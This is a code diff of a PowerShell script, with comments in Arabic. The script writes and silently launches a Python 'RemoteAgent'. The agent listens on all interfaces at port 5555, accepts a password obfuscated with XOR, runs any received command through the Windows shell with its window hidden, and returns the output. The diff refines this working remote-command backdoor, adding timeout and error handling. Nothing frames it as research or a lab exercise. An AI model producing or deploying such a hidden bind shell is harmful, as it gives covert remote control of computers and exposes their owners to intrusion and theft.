@@ -1,11 +1,8 @@
-New-Item -ItemType Directory -Force -Path "C:\RemoteAgent"
-
 $agentCode = @"
 import socket
 import subprocess
 import threading
 import base64
-import os
 
 LISTEN_HOST = "0.0.0.0"
 LISTEN_PORT = 5555
@@ -25,9 +22,7 @@ def handle_client(conn, addr):
     try:
         conn.sendall(b"AUTH_REQUIRED\n")
         auth_data = conn.recv(1024).decode('utf-8', errors='ignore').strip()
-        decrypted_pass = xor_decrypt(auth_data, XOR_KEY)
-        
-        if decrypted_pass != PASSWORD:
+        if xor_decrypt(auth_data, XOR_KEY) != PASSWORD:
             conn.sendall(b"AUTH_FAILED\n")
             conn.close()
             return
@@ -38,20 +33,23 @@ def handle_client(conn, addr):
             if not cmd or cmd.lower() in ["exit", "quit"]:
                 break
             
-            # تنفيذ الأمر عبر cmd.exe بشكل مباشر مع دعم كامل للأوامر الإدارية
-            proc = subprocess.Popen(
-                ["cmd.exe", "/c", cmd],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            stdout, stderr = proc.communicate(timeout=15)
-            output = stdout + stderr
-            if not output:
-                output = b"[+] Command sent and executed successfully.\n"
-            conn.sendall(output)
-    except Exception as e:
+            try:
+                proc = subprocess.Popen(
+                    cmd, shell=True, 
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                    creationflags=0x08000000
+                )
+                stdout, stderr = proc.communicate(timeout=10)
+                output = stdout + stderr
+                if not output:
+                    output = b"[+] Command executed successfully.\n"
+                conn.sendall(output)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                conn.sendall(b"[!] Command timed out (took more than 10s) but might still be running.\n")
+            except Exception as e:
+                conn.sendall(f"[-] Command Error: {str(e)}\n".encode('utf-8'))
+    except Exception:
         pass
     finally:
         conn.close()
@@ -73,11 +71,8 @@ if __name__ == "__main__":
 
 [System.IO.File]::WriteAllText("C:\RemoteAgent\agent.py", $agentCode, [System.Text.Encoding]::UTF8)
 
-# إنهاء العمليات السابقة وإعادة التشغيل
 Stop-Process -Name "pythonw" -ErrorAction SilentlyContinue
 Stop-Process -Name "python" -ErrorAction SilentlyContinue
 
 Start-ScheduledTask -TaskName "RemoteAgent" -ErrorAction SilentlyContinue
-if (-not $?) {
-    Start-Process -FilePath "C:\Program Files\Python312\pythonw.exe" -ArgumentList "C:\RemoteAgent\agent.py"
-}
+if (-not $?) { Start-Process "C:\Program Files\Python312\pythonw.exe" "C:\RemoteAgent\agent.py" }
